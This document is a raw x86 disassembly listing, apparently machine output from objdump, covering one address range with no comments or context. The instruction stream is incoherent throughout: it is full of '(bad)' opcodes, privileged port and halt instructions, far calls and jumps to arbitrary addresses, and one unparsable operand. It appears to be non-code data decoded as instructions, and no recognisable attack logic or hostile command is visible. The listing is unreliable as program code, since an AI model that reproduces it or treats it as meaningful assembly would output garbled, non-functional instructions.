  409f29:	mov    ebx,DWORD PTR [edi-0x74]
  409f2c:	test   eax,0x42002dc7
  409f31:	sub    eax,0xa8ed8ad9
  409f36:	push   esp
  409f37:	cs jo  0x409f33
  409f3a:	jmp    0x409f9a
  409f3c:	cwde   
  409f3d:	sti    
  409f3e:	sub    BYTE PTR [esp+esi*2+0x1cc251a],ch
  409f45:	hlt    
  409f46:	mov    ebp,0xddd8225c
  409f4b:	out    dx,eax
  409f4c:	icebp  
  409f4d:	mov    al,BYTE PTR [edi-0x55e49398]
  409f53:	test   cl,al
  409f55:	loopne 0x409f12
  409f57:	jg     0x409f9d
  409f59:	aam    0x1d
  409f5b:	dec    eax
  409f5c:	mov    es,WORD PTR [edi]
  409f5e:	fisubr DWORD PTR [ebp+0x57]
  409f61:	push   eax
  409f62:	xchg   ecx,eax
  409f63:	bound  edx,QWORD PTR ds:0xf8decabc
  409f69:	or     bl,0x9f
  409f6c:	leave  
  409f6d:	mov    esi,0x1c7b1885
  409f72:	cmp    DWORD PTR [edx+0x76cb549],ebx
  409f78:	scas   eax,DWORD PTR es:[edi]
  409f79:	test   eax,0xd99330c6
  409f7e:	cmp    eax,0xb5e9493f
  409f83:	mov    edx,0xf8ae3b2a
  409f88:	cmp    ecx,DWORD PTR ds:0xb7b169cd
  409f8e:	adc    DWORD PTR [esi],esi
  409f90:	sbb    esp,DWORD PTR [ebp+0x46b373db]
  409f96:	sbb    cl,BYTE PTR [ebx-0x23]
  409f99:	push   ebx
  409f9a:	mov    cl,0x39
  409f9c:	popf   
  409f9d:	jns    0x409f64
  409f9f:	nop
  409fa0:	cwde   
  409fa1:	mul    ebp
  409fa3:	(bad)  
  409fa4:	stos   BYTE PTR es:[edi],al
  409fa5:	ins    BYTE PTR es:[edi],dx
  409fa6:	adc    eax,0xd6b0c2cb
  409fab:	pop    es
  409fac:	jle    0x409fdf
  409fae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409faf:	gs je  0x409f7c
  409fb2:	inc    esi
  409fb3:	nop
  409fb4:	imul   edi,DWORD PTR [edi+0x11d12721],0x2
  409fbb:	outs   dx,DWORD PTR ds:[esi]
  409fbc:	imul   esi,ebx,0xffffffb4
  409fbf:	cmp    esi,edi
  409fc1:	out    dx,al
  409fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fc3:	arpl   WORD PTR [edi-0x68c78c01],si
  409fc9:	call   0x5ec3:0x2622f245
  409fd0:	xchg   esp,eax
  409fd1:	in     eax,0x1e
  409fd3:	pop    esp
  409fd4:	jmp    0x409faf
  409fd6:	lahf   
  409fd7:	aas    
  409fd8:	scas   eax,DWORD PTR es:[edi]
  409fd9:	push   ebx
  409fda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fdb:	push   ds
  409fdc:	mov    cl,0x72
  409fde:	push   esi
  409fdf:	and    BYTE PTR [ecx+0x73],dl
  409fe2:	int    0x7d
  409fe4:	adc    al,BYTE PTR [edx]
  409fe6:	pusha  
  409fe7:	lods   al,BYTE PTR ds:[esi]
  409fe8:	pushf  
  409fe9:	lahf   
  409fea:	iret   
  409feb:	retf   
  409fec:	dec    edx
  409fed:	xor    eax,0x9594c07b
  409ff2:	cdq    
  409ff3:	inc    eax
  409ff4:	and    ebx,esi
  409ff6:	sub    bl,BYTE PTR [esi]
  409ff8:	and    BYTE PTR [esi],dl
  409ffa:	mov    edx,0x289525ca
  409fff:	push   ebp
  40a000:	push   0x7aae458a
  40a005:	into   
  40a006:	dec    esp
  40a007:	mov    eax,0xc0c28568
  40a00c:	in     eax,dx
  40a00d:	sti    
  40a00e:	in     eax,0x92
  40a010:	dec    ebp
  40a011:	sub    BYTE PTR ds:0x3f95cf4,0x91
  40a018:	mov    ah,0x1
  40a01a:	add    DWORD PTR [ebx-0x3b],0xffffffbf
  40a01e:	mov    edx,0x139b28c9
  40a023:	icebp  
  40a024:	dec    edx
  40a025:	cs ins BYTE PTR es:[edi],dx
  40a027:	leave  
  40a028:	pop    ebx
  40a029:	out    dx,al
  40a02a:	push   eax
  40a02b:	outs   dx,DWORD PTR ds:[esi]
  40a02c:	mov    ecx,0x71bdfb24
  40a031:	xchg   esi,eax
  40a032:	arpl   WORD PTR [edx],bx
  40a034:	ins    DWORD PTR es:[edi],dx
  40a035:	sub    eax,0x9681a043
  40a03a:	mov    al,BYTE PTR es:[ecx+0x2de2056b]
  40a041:	fucomp st(3)
  40a043:	cmp    BYTE PTR [eax-0x30f1b85f],bl
  40a049:	cmp    edi,DWORD PTR [ecx-0x774205e5]
  40a04f:	loope  0x40a075
  40a051:	cmp    DWORD PTR [ebx+ecx*4-0x59],0x20
  40a056:	sub    esp,esp
  40a058:	hlt    
  40a059:	dec    esi
  40a05a:	mov    al,bl
  40a05c:	adc    eax,0x8a2952db
  40a061:	mov    esp,0x66254177
  40a066:	xchg   ebp,eax
  40a067:	in     al,0xb7
  40a069:	push   esi
  40a06a:	aaa    
  40a06b:	dec    ecx
  40a06c:	pop    esi
  40a06d:	in     al,0x99
  40a06f:	leave  
  40a070:	mov    dh,0xf0
  40a072:	fld    DWORD PTR [eax+0x45]
  40a075:	add    BYTE PTR [esp+ebx*1],bl
  40a078:	adc    eax,0x7df92198
  40a07d:	inc    esi
  40a07e:	jbe    0x40a07e
  40a080:	addr16 stc 
  40a082:	aad    0x36
  40a084:	add    ebx,DWORD PTR [edi-0x2c]
  40a087:	cmp    ch,BYTE PTR [edi-0x72]
  40a08a:	call   FWORD PTR [edx]
  40a08c:	int3   
  40a08d:	jle    0x40a0f1
  40a08f:	dec    esi
  40a090:	lods   eax,DWORD PTR ds:[esi]
  40a091:	bound  ebx,QWORD PTR [ebx]
  40a093:	jne    0x40a04a
  40a095:	mov    dl,0x50
  40a097:	ins    DWORD PTR es:[edi],dx
  40a098:	shr    DWORD PTR [ebp+esi*8+0x3b],cl
  40a09c:	sbb    eax,DWORD PTR [esi+ebx*1+0x32]
  40a0a0:	scas   eax,DWORD PTR es:[edi]
  40a0a1:	imul   edx,DWORD PTR [edx],0x7f781851
  40a0a7:	xor    bl,dh
  40a0a9:	in     al,0xe0
  40a0ab:	(bad)  
  40a0ad:	push   ebp
  40a0ae:	imul   edi,edi,0xffffffea
  40a0b1:	(bad)  
  40a0b2:	push   ss
  40a0b3:	and    DWORD PTR [ebx+0x3e],ebp
  40a0b6:	mov    es,WORD PTR [ebx+eax*8]
  40a0b9:	fsubrp st(0),st
  40a0bb:	inc    edi
  40a0bc:	psrld  mm7,QWORD PTR [ebp-0x18891b83]
  40a0c3:	xor    eax,0x3ee44fa9
  40a0c8:	jne    0x40a07f
  40a0ca:	test   bh,dl
  40a0cc:	xor    BYTE PTR [edx+0x4623f042],ah
  40a0d2:	out    0xd3,eax
  40a0d4:	mov    ds:0xbd17806b,al
  40a0d9:	inc    ebp
  40a0da:	xor    BYTE PTR [edx+0x65a4ed2e],ch
  40a0e0:	jo     0x40a06c
  40a0e2:	test   BYTE PTR [ebx],cl
  40a0e4:	loop   0x40a0fb
  40a0e6:	shl    DWORD PTR [edi+0xa],cl
  40a0e9:	jne    0x40a0d5
  40a0eb:	sbb    bl,BYTE PTR [edx]
  40a0ed:	sbb    al,0xe7
  40a0ef:	sub    al,0x5
  40a0f1:	cwde   
  40a0f2:	mov    ecx,0x43151288
  40a0f7:	test   eax,0x8e8877e3
  40a0fc:	scas   al,BYTE PTR es:[edi]
  40a0fd:	add    eax,0x9dc34c6
  40a102:	jnp    0x40a0e8
  40a104:	xchg   ebx,eax
  40a105:	fwait
  40a106:	dec    eax
  40a107:	mov    esi,0xc5127279
  40a10c:	test   eax,esi
  40a10e:	jb     0x40a17d
  40a110:	fild   DWORD PTR [ecx+esi*4]
  40a113:	pop    DWORD PTR ds:0xe7830501
  40a119:	or     DWORD PTR [edi+0x7f],ebp
  40a11c:	sti    
  40a11d:	push   ss
  40a11e:	xor    cl,BYTE PTR [ecx-0x54bb3e0f]
  40a124:	xor    edi,DWORD PTR [ebx]
  40a126:	or     ecx,0xf451c6d2
  40a12c:	and    eax,0x5d6d0b6c
  40a131:	mov    dl,0xea
  40a133:	or     dh,BYTE PTR [ecx+0x7ee25235]
  40a139:	cmp    al,0x16
  40a13b:	ss call 0x3a43:0x3e7508d2
  40a143:	shl    DWORD PTR [edx-0x192e513f],0x9a
  40a14a:	neg    BYTE PTR [esi]
  40a14c:	ret    0xe874
  40a14f:	add    eax,0xef183fb1
  40a154:	test   al,0x68
  40a156:	shr    BYTE PTR fs:[eax],0xac
  40a15a:	dec    ebx
  40a15b:	sub    edx,ecx
  40a15d:	shl    BYTE PTR [ebp+0x74197cd8],cl
  40a163:	neg    BYTE PTR [esi-0x5a910cc8]
  40a169:	push   edi
  40a16a:	push   0xfffffff2
  40a16c:	aaa    
  40a16d:	pop    ecx
  40a16e:	and    BYTE PTR [edi-0x5b6c386b],al
  40a174:	adc    BYTE PTR [ebx+eiz*4-0x4d0aa06e],ah
  40a17b:	shl    BYTE PTR [edx],1
  40a17d:	and    DWORD PTR [esi-0x22],esi
  40a180:	into   
  40a181:	lds    edi,FWORD PTR [ebp+esi*4-0x4b]
  40a185:	aas    
  40a186:	jl     0x40a16c
  40a188:	xor    DWORD PTR [edi],ebp
  40a18a:	mov    eax,ds:0xdc875e21
  40a18f:	cmp    dl,BYTE PTR [esp+ebp*1+0x6b]
  40a193:	inc    esi
  40a194:	xor    al,0xe
  40a196:	add    DWORD PTR [eax*8-0x1ab472a8],0x59fdc14e
  40a1a1:	ret    0x5ddd
  40a1a4:	mov    WORD PTR [edi],ds
  40a1a6:	pusha  
  40a1a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1a8:	mov    eax,0x47d7b6d6
  40a1ad:	xchg   DWORD PTR [esi-0x5f],esp
  40a1b0:	and    dh,BYTE PTR [ecx-0x761fd8e4]
  40a1b6:	pop    edx
  40a1b7:	popf   
  40a1b8:	cmp    BYTE PTR [edi],dl
  40a1ba:	push   esp
  40a1bb:	in     eax,dx
  40a1bc:	pop    edx
  40a1bd:	pop    ss
  40a1be:	cdq    
  40a1bf:	fdiv   DWORD PTR [esi]
  40a1c1:	daa    
  40a1c2:	xchg   cx,ax
  40a1c4:	sti    
  40a1c5:	pushf  
  40a1c6:	imul   edx,DWORD PTR [edx+0x5b],0x6e
  40a1ca:	cld    
  40a1cb:	inc    esi
  40a1cc:	or     DWORD PTR [ebp-0x7f],eax
  40a1cf:	sub    eax,0x8d83d675
  40a1d4:	sbb    bh,bh
  40a1d6:	jmp    DWORD PTR [ecx-0x5f]
  40a1d9:	je     0x40a1c0
  40a1db:	mov    ebx,0xc26e112
  40a1e0:	out    dx,eax
  40a1e1:	add    al,0x28
  40a1e3:	stc    
  40a1e4:	scas   al,BYTE PTR es:[edi]
  40a1e5:	xor    al,0x5b
  40a1e7:	or     al,0x57
  40a1e9:	lods   al,BYTE PTR ds:[esi]
  40a1ea:	push   si
  40a1ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1ed:	pop    ebx
  40a1ee:	and    al,0x56
  40a1f0:	add    BYTE PTR [esi-0x30],0x9e
  40a1f4:	ss add ch,cl
  40a1f7:	call   DWORD PTR [edx]
  40a1f9:	cmc    
  40a1fa:	cdq    
  40a1fb:	(bad)  
  40a1fd:	mov    al,ds:0xea9a554e
  40a202:	shr    DWORD PTR [esi+ebx*4+0x73],cl
  40a206:	push   edx
  40a207:	(bad)  
  40a208:	clc    
  40a209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a20a:	mov    bh,0xf2
  40a20c:	dec    edx
  40a20d:	imul   edx,DWORD PTR [eax-0x45],0xffffff9f
  40a211:	(bad)  
  40a212:	int    0x99
  40a214:	shr    BYTE PTR [eax],1
  40a216:	xchg   DWORD PTR [edi+0x489b71c4],esp
  40a21c:	xor    bh,cl
  40a21e:	mov    al,ds:0xc58001d0
  40a223:	popa   
  40a224:	adc    DWORD PTR [ebx],0x56ae2c57
  40a22a:	rcr    BYTE PTR [edi+edx*4+0x440d8263],1
  40a231:	dec    esi
  40a232:	cs and bl,bh
  40a235:	sub    al,0xf5
  40a237:	sbb    bh,dl
  40a239:	pop    ebp
  40a23a:	js     0x40a24c
  40a23c:	pop    edx
  40a23d:	adc    bl,BYTE PTR [ebp+eax*2+0x66d1eae6]
  40a244:	xchg   ebp,eax
  40a245:	xchg   BYTE PTR [eax-0x2fd8eeaa],cl
  40a24b:	cmp    eax,0xbb599563
  40a250:	mov    cl,0xb1
  40a252:	xchg   ecx,eax
  40a253:	outs   dx,DWORD PTR ds:[esi]
  40a254:	jle    0x40a1fc
  40a256:	mov    DWORD PTR [ebp+ecx*4+0x5e],edx
  40a25a:	dec    edi
  40a25b:	sbb    DWORD PTR [esi],eax
  40a25d:	mov    edi,ebp
  40a25f:	bound  edi,QWORD PTR [edi-0x749bde31]
  40a265:	adc    DWORD PTR [edi],ecx
  40a267:	jo     0x40a22a
  40a269:	mov    bl,0xc4
  40a26b:	std    
  40a26c:	push   cs
  40a26d:	sti    
  40a26e:	adc    al,0xfb
  40a270:	push   0xffffffb1
  40a272:	or     eax,DWORD PTR [ecx-0x75]
  40a275:	jns    0x40a295
  40a277:	leave  
  40a278:	test   DWORD PTR [esp+eiz*8],ebp
  40a27b:	cmp    esp,DWORD PTR [edi+0x180abc9f]
  40a281:	in     al,0x3d
  40a283:	inc    ebx
  40a284:	adc    edx,DWORD PTR [ecx+0x67fbdfe4]
  40a28a:	out    dx,al
  40a28b:	int3   
  40a28c:	rol    DWORD PTR [ebp-0x2f966416],cl
  40a292:	jge    0x40a279
  40a294:	jl     0x40a27a
  40a296:	xchg   ebp,eax
  40a297:	cmp    BYTE PTR [eax+0x7c],ah
  40a29a:	clc    
  40a29b:	sbb    al,0xc9
  40a29d:	dec    edx
  40a29e:	test   DWORD PTR [ebx],ecx
  40a2a0:	scas   al,BYTE PTR es:[edi]
  40a2a1:	add    edx,ebx
  40a2a3:	call   edx
  40a2a5:	mov    dh,0xab
  40a2a7:	and    BYTE PTR ds:0xf6ede493,dl
  40a2ad:	pusha  
  40a2ae:	adc    DWORD PTR [ebx+0x2e],edx
  40a2b1:	xor    esi,DWORD PTR [edx-0x48]
  40a2b4:	dec    ecx
  40a2b5:	cld    
  40a2b6:	mov    edx,0xddb63829
  40a2bb:	mov    al,0x49
  40a2bd:	dec    ecx
  40a2be:	push   ebp
  40a2bf:	fwait
  40a2c0:	or     al,0xf1
  40a2c2:	sub    edi,esp
  40a2c4:	lods   al,BYTE PTR ds:[esi]
  40a2c5:	or     al,0x2f
  40a2c7:	repz hlt 
  40a2c9:	pop    esi
  40a2ca:	ja     0x40a32d
  40a2cc:	jne    0x40a282
  40a2ce:	add    DWORD PTR [ecx+edx*2+0x3c],ecx
  40a2d2:	jo     0x40a2cc
  40a2d4:	mov    dh,0xe5
  40a2d6:	mov    ah,BYTE PTR [ebx+eax*8]
  40a2d9:	ins    DWORD PTR es:[edi],dx
  40a2da:	push   es
  40a2db:	std    
  40a2dc:	add    eax,0x27c6fe19
  40a2e1:	jne    0x40a357
  40a2e3:	sub    eax,DWORD PTR [ebx]
  40a2e5:	jnp    0x40a298
  40a2e7:	jne    0x40a28c
  40a2e9:	mov    dh,BYTE PTR [ebp+0xdb44661]
  40a2ef:	sub    BYTE PTR [ebx],0x32
  40a2f2:	and    eax,0xac1e3f78
  40a2f7:	xor    eax,0x37db0b6e
  40a2fc:	jmp    0x40a2aa
  40a2fe:	shl    bh,1
  40a300:	or     edx,DWORD PTR [eax-0x7]
  40a303:	in     al,dx
  40a304:	sti    
  40a305:	sbb    eax,DWORD PTR [edi+0x70]
  40a308:	push   ds
  40a309:	lods   eax,DWORD PTR ds:[esi]
  40a30a:	int    0x71
  40a30c:	enter  0xbe3f,0x15
  40a310:	jg     0x40a338
  40a312:	sub    dh,BYTE PTR [edi-0x3a660862]
  40a318:	call   0x90de:0x99eae27f
  40a31f:	retf   
  40a320:	enter  0x7a73,0x22
  40a324:	jge    0x40a2f3
  40a326:	jno    0x40a321
  40a328:	int    0x99
  40a32a:	push   0xcefff73d
  40a32f:	ja     0x40a357
  40a331:	jno    0x40a34d
  40a333:	test   DWORD PTR [edi+0x1da395fa],0xaa111eb9
  40a33d:	xchg   ebp,eax
  40a33e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a33f:	js     0x40a2d5
  40a341:	(bad)  
  40a342:	lods   eax,DWORD PTR ds:[esi]
  40a343:	xchg   edi,eax
  40a344:	mov    esp,0x75eb86a7
  40a349:	mov    ebp,0x2c3f6d37
  40a34e:	pop    ebp
  40a34f:	test   DWORD PTR [ebx],esp
  40a351:	jle    0x40a2df
  40a353:	inc    esp
  40a354:	repnz sbb ebx,edi
  40a357:	stos   BYTE PTR es:[edi],al
  40a358:	push   edi
  40a359:	mov    eax,0x78f0bd06
  40a35e:	mov    DWORD PTR ds:0xa6bc4ab9,edi
  40a364:	sub    esi,DWORD PTR [ebx]
  40a366:	iret   
  40a367:	sub    al,0xa5
  40a369:	jge    0x40a36b
  40a36b:	stos   BYTE PTR es:[edi],al
  40a36c:	push   esp
  40a36d:	xchg   ebx,eax
  40a36e:	jb     0x40a3d3
  40a370:	ins    BYTE PTR es:[edi],dx
  40a371:	pop    ds
  40a372:	jae    0x40a3ab
  40a374:	ss jp  0x40a3e5
  40a377:	lods   al,BYTE PTR ds:[esi]
  40a378:	imul   esp,DWORD PTR [edi+0x44],0xb20fc18c
  40a37f:	jae    0x40a349
  40a381:	dec    ecx
  40a382:	cli    
  40a383:	or     al,0x68
  40a385:	cmc    
  40a386:	shr    DWORD PTR [edx-0x4cfa2276],1
  40a38c:	jb     0x40a3c8
  40a38e:	sub    DWORD PTR [esi],0x53
  40a391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a392:	repnz push ecx
  40a394:	out    dx,eax
  40a395:	xchg   ebp,eax
  40a396:	loop   0x40a33b
  40a398:	and    eax,0x43a50fcc
  40a39d:	out    dx,al
  40a39e:	out    dx,eax
  40a39f:	add    eax,0xfed39aaf
  40a3a4:	call   0xbd12:0x85adc40
  40a3ab:	loop   0x40a3bc
  40a3ad:	int    0xea
  40a3af:	pop    ebp
  40a3b0:	pop    esi
  40a3b1:	(bad)  
  40a3b2:	dec    edi
  40a3b3:	and    BYTE PTR [ebx],ah
  40a3b5:	ja     0x40a3dc
  40a3b7:	pop    edx
  40a3b8:	pop    ebp
  40a3b9:	jmp    0xc44c:0xaf3df4e9
  40a3c0:	fsub   QWORD PTR [edi-0x258ab9e9]
  40a3c6:	rcl    BYTE PTR [eax+0x72],1
  40a3c9:	stos   BYTE PTR es:[edi],al
  40a3ca:	popa   
  40a3cb:	or     eax,0x351d6673
  40a3d0:	retf   0xd058
  40a3d3:	xchg   eax,ecx
  40a3d5:	and    al,0x11
  40a3d7:	mov    ebx,DWORD PTR [esi+0x9e8b203]
  40a3dd:	ds in  al,0xf3
  40a3e0:	shr    DWORD PTR [edi-0x16],0x79
  40a3e4:	or     BYTE PTR [ebx],al
  40a3e6:	leave  
  40a3e7:	arpl   WORD PTR [ecx+eax*4-0x16df66a6],si
  40a3ee:	push   ss
  40a3ef:	mov    eax,ds:0xe0f84a9b
  40a3f4:	dec    ebx
  40a3f5:	arpl   bp,bx
  40a3f7:	rcl    DWORD PTR [edi+ebp*1],1
  40a3fa:	sbb    cl,BYTE PTR [esi]
  40a3fc:	and    DWORD PTR [edx-0x5f],0x6c
  40a400:	test   al,0x9f
  40a402:	xchg   ebx,eax
  40a403:	lahf   
  40a404:	js     0x40a41b
  40a406:	shl    cl,1
  40a408:	inc    edx
  40a409:	dec    ebx
  40a40a:	inc    esp
  40a40b:	(bad)  
  40a40c:	int    0x76
  40a40e:	adc    DWORD PTR [ecx+0x7cd83050],edx
  40a414:	mov    al,ds:0x29521b3a
  40a419:	pop    edx
  40a41a:	jg     0x40a3f7
  40a41c:	jge    0x40a488
  40a41e:	jp     0x40a445
  40a420:	cmc    
  40a421:	mov    ebp,0x2d839576
  40a426:	xchg   ebp,eax
  40a427:	add    eax,0xfcde7c4e
  40a42c:	sub    DWORD PTR [ebp+0x56],edx
  40a42f:	inc    ecx
  40a430:	(bad)  
  40a432:	xchg   edx,eax
  40a433:	lods   eax,DWORD PTR ds:[esi]
  40a434:	sub    cl,al
  40a436:	mov    ah,BYTE PTR [ebx]
  40a438:	mov    ecx,ss
  40a43a:	rcr    DWORD PTR [eax],0xc2
  40a43d:	aas    
  40a43e:	push   ds
  40a43f:	aad    0x62
  40a441:	mov    esi,0x72fd75f6
  40a446:	cmp    bh,cl
  40a448:	pop    esp
  40a449:	pop    ds
  40a44a:	xchg   edx,eax
  40a44b:	inc    edx
  40a44c:	mov    ebx,0x1ba1053e
  40a451:	fmul   QWORD PTR [ebp+0x738d9e11]
  40a457:	add    DWORD PTR [ebp+0x43],ebx
  40a45a:	aad    0xbf
  40a45c:	jae    0x40a3e5
  40a45e:	push   edi
  40a45f:	dec    esi
  40a460:	xlat   BYTE PTR ds:[ebx]
  40a461:	or     al,BYTE PTR [ebx]
  40a463:	mov    dl,0xdc
  40a465:	(bad)  
  40a466:	cmp    BYTE PTR [ebx+0x4c],ah
  40a469:	adc    dh,BYTE PTR ss:[ebx+0x3d57466c]
  40a470:	mov    bl,0xb5
  40a472:	aas    
  40a473:	fmul   QWORD PTR [ecx]
  40a475:	dec    ebx
  40a476:	ja     0x40a419
  40a478:	gs stos DWORD PTR es:[edi],eax
  40a47a:	hlt    
  40a47b:	and    ebp,DWORD PTR [ecx+0x18]
  40a47e:	js     0x40a4ff
  40a480:	inc    esi
  40a481:	push   0xffffffcb
  40a483:	pushf  
  40a484:	in     eax,0x69
  40a486:	(bad)  
  40a487:	(bad)  
  40a488:	sub    al,0x49
  40a48a:	cmp    DWORD PTR [ecx+0x7f847885],ecx
  40a490:	rcr    DWORD PTR [ecx],cl
  40a492:	xor    bh,BYTE PTR [edx]
  40a494:	mov    ebp,0xc05ac7f1
  40a499:	ins    BYTE PTR es:[edi],dx
  40a49a:	out    dx,eax
  40a49b:	or     bl,bh
  40a49d:	add    BYTE PTR [esi-0x5e],0x90
  40a4a1:	jno    0x40a479
  40a4a3:	je     0x40a4b7
  40a4a5:	aas    
  40a4a6:	imul   eax,DWORD PTR [edi-0x44],0x40
  40a4aa:	sub    al,0x1c
  40a4ac:	adc    al,0xe9
  40a4ae:	and    BYTE PTR [esi+ebx*8+0x2756bca4],al
  40a4b5:	adc    eax,0x32b29202
  40a4ba:	xchg   esi,eax
  40a4bb:	xlat   BYTE PTR ds:[ebx]
  40a4bc:	je     0x40a4ec
  40a4be:	das    
  40a4bf:	sub    eax,ebp
  40a4c1:	mov    eax,0xee9ddc24
  40a4c6:	cs ja  0x40a49f
  40a4c9:	pushf  
  40a4ca:	fdivp  st(5),st
  40a4cc:	rcr    ecx,1
  40a4ce:	pop    ss
  40a4cf:	test   dh,0x2d
  40a4d2:	test   BYTE PTR [eax-0x7f7f39b7],cl
  40a4d8:	fldpi  
  40a4da:	xlat   BYTE PTR ds:[ebx]
  40a4db:	push   0x6f
  40a4dd:	repnz xchg ebx,eax
  40a4df:	test   BYTE PTR [ebp+edi*1+0x11],dl
  40a4e3:	icebp  
  40a4e4:	or     al,0x14
  40a4e6:	hlt    
  40a4e7:	daa    
  40a4e8:	inc    edx
  40a4e9:	mov    ebp,0x2be2f6da
  40a4ee:	dec    ebp
  40a4ef:	xor    al,0xf
  40a4f1:	retf   
  40a4f2:	mov    bh,cl
  40a4f4:	inc    ebx
  40a4f5:	inc    esi
  40a4f6:	sub    al,0x7a
  40a4f8:	push   es
  40a4f9:	retf   0x65a5
  40a4fc:	ds mov ebx,0xa2f8a6b0
  40a502:	out    0x2d,eax
  40a504:	popa   
  40a505:	push   ecx
  40a506:	jle    0x40a4a0
  40a508:	shr    BYTE PTR [edx],1
  40a50a:	ins    DWORD PTR es:[edi],dx
  40a50b:	shr    dh,cl
  40a50d:	lea    ebp,[edi]
  40a50f:	sub    ebp,edi
  40a511:	popa   
  40a512:	pop    esi
  40a513:	mov    cl,BYTE PTR [edx-0xe]
  40a516:	jnp    0x40a4b7
  40a518:	lea    edx,ss:[esi-0x2780e306]
  40a51f:	mov    dh,BYTE PTR ds:0xee38affa
  40a525:	addr16 dec esp
  40a527:	pop    esp
  40a528:	scas   al,BYTE PTR es:[edi]
  40a529:	in     eax,dx
  40a52a:	int    0x6d
  40a52c:	sub    ah,BYTE PTR [esi+0x17]
  40a52f:	test   BYTE PTR [ebx+0x15],bh
  40a532:	fcmovbe st,st(0)
  40a534:	nop
  40a535:	push   esi
  40a536:	ret    0xf2d
  40a539:	mov    gs,WORD PTR [edi+eiz*8-0x54a6b9c8]
  40a540:	jecxz  0x40a4e0
  40a542:	xchg   esi,eax
  40a543:	lods   al,BYTE PTR ds:[esi]
  40a544:	mov    dl,0x2f
  40a546:	stos   DWORD PTR es:[edi],eax
  40a547:	dec    edx
  40a548:	jp     0x40a56d
  40a54a:	loope  0x40a583
  40a54c:	aam    0x7b
  40a54e:	jecxz  0x40a4f8
  40a550:	add    edx,ebp
  40a552:	shr    DWORD PTR [ebx-0x7a],1
  40a555:	xor    al,0x73
  40a557:	outs   dx,BYTE PTR ds:[esi]
  40a558:	push   esi
  40a559:	enter  0xf1a8,0x5e
  40a55d:	inc    edx
  40a55e:	sbb    eax,0xa92f4db1
  40a563:	adc    BYTE PTR [eax],cl
  40a565:	daa    
  40a566:	xor    dl,bl
  40a568:	or     ah,BYTE PTR [ebx-0x6e]
  40a56b:	push   esp
  40a56c:	cmp    al,0x8
  40a56e:	fild   DWORD PTR [ecx+0x4a]
  40a571:	mov    eax,0xec993dec
  40a576:	push   edi
  40a577:	jne    0x40a589
  40a579:	push   0xcbec9288
  40a57e:	outs   dx,BYTE PTR ds:[esi]
  40a57f:	stc    
  40a580:	push   cs
  40a581:	rcl    BYTE PTR [esi],1
  40a583:	call   0x34c64cf
  40a588:	sbb    ebx,DWORD PTR [esi-0x396df7bd]
  40a58e:	sar    bh,cl
  40a590:	jmp    0x579be243
  40a595:	enter  0x26a8,0x23
  40a599:	lock arpl sp,bp
  40a59c:	sahf   
  40a59d:	mov    esp,0x658813ee
  40a5a2:	hlt    
  40a5a3:	push   0xbb60fed1
  40a5a8:	(bad)  
  40a5a9:	leave  
  40a5aa:	jmp    0xbd5b:0xb782d911
  40a5b1:	das    
  40a5b2:	test   edi,eax
  40a5b4:	inc    edi
  40a5b5:	jp     0x40a5b1
  40a5b7:	test   DWORD PTR [ecx-0x55],edx
  40a5ba:	inc    ebp
  40a5bb:	cwde   
  40a5bc:	jmp    0xd26a60bb
  40a5c1:	pusha  
  40a5c2:	mov    ?,ecx
  40a5c4:	dec    edi
  40a5c5:	add    esi,DWORD PTR [edx+0x49]
  40a5c8:	xchg   ecx,eax
  40a5c9:	frstor [esi-0x52bf9fe8]
  40a5cf:	mov    esi,0xe9921406
  40a5d4:	rcl    DWORD PTR [edx],0x78
  40a5d7:	out    dx,eax
  40a5d8:	(bad)  
  40a5d9:	sub    al,0x11
  40a5db:	push   ebp
  40a5dc:	fadd   QWORD PTR [ebp+edi*8+0x52]
  40a5e0:	gs setle bl
  40a5e4:	mov    ebp,0x38f72da4
  40a5e9:	aam    0xa8
  40a5eb:	mov    bh,0xa8
  40a5ed:	mov    bh,0x29
  40a5ef:	adc    eax,0xb2ce201e
  40a5f4:	icebp  
  40a5f5:	inc    ecx
  40a5f6:	(bad)  
  40a5f7:	sbb    eax,0x48d3bf7
  40a5fc:	sub    BYTE PTR [edx+0x2690c4f9],ah
  40a602:	icebp  
  40a603:	call   0x9badea6f
  40a608:	xchg   esi,eax
  40a609:	push   edi
  40a60a:	inc    esi
  40a60b:	push   esp
  40a60c:	ret    0x20d0
  40a60f:	jae    0x40a635
  40a611:	cmp    DWORD PTR [edi],ebx
  40a613:	mov    dl,0x79
  40a615:	or     edi,ebx
  40a617:	shl    DWORD PTR [esi],cl
  40a619:	dec    esi
  40a61a:	idiv   BYTE PTR [esi+ebx*4-0x6ee87d0b]
  40a621:	sbb    eax,0xddee0a02
  40a626:	adc    BYTE PTR ds:[eax+eiz*2-0x76],ch
  40a62b:	ficom  WORD PTR [esi+ebx*8-0x594a836a]
  40a632:	push   ds
  40a633:	dec    eax
  40a634:	mov    esi,0x83fc8610
  40a639:	add    BYTE PTR [edi-0x4f],bh
  40a63c:	pop    es
  40a63d:	jmp    0x7b60:0x745b3073
  40a644:	cmp    BYTE PTR [ebp-0x15],dl
  40a647:	lock pop ebp
  40a649:	cmc    
  40a64a:	fsub   QWORD PTR [edi+0x752daaa0]
  40a650:	cs xchg esi,eax
  40a652:	xchg   ecx,eax
  40a653:	call   0xfa16e964
  40a658:	lea    ebx,[ecx]
  40a65a:	into   
  40a65b:	or     edi,DWORD PTR [edx+0x3e1f53a8]
  40a661:	out    0x66,eax
  40a663:	dec    edx
  40a664:	sub    DWORD PTR [esi+0x77b5f884],esi
  40a66a:	add    BYTE PTR [esi-0x2af45ab9],0xb6
  40a671:	mov    ebp,0x35c73082
  40a676:	mov    dl,BYTE PTR [eax+esi*8]
  40a679:	rcl    DWORD PTR [ebx+0x2c6c3e8b],0x1a
  40a680:	gs in  al,0x58
  40a683:	jae    0x40a65f
  40a685:	mov    ah,0x41
  40a687:	jl     0x40a61b
  40a689:	test   ebx,edi
  40a68b:	xlat   BYTE PTR ds:[ebx]
  40a68c:	hlt    
  40a68d:	retf   0xd457
  40a690:	scas   al,BYTE PTR es:[edi]
  40a691:	xchg   esi,eax
  40a692:	sahf   
  40a693:	shl    esp,1
  40a695:	cwde   
